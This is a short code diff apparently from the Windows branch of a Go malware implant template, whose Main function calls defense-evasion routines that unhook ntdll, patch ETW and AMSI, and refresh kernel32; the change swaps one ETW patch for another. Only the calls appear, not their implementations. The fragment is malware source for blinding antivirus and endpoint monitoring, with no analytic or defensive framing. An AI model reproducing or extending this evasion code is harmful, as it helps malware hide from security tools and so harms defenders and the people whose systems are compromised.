@@ -124,7 +124,7 @@ func Main() {
 	// {{if eq .Config.GOOS "windows"}}
 	evasion.UnhookNtdllFromKnownDlls()
 	evasion.PatchETW()
-	evasion.PatchETWThreatIntel()
+	evasion.PatchETWWriteEx()
 	evasion.PatchAMSI()
 	evasion.RefreshPE("kernel32.dll")
 	// {{end}}
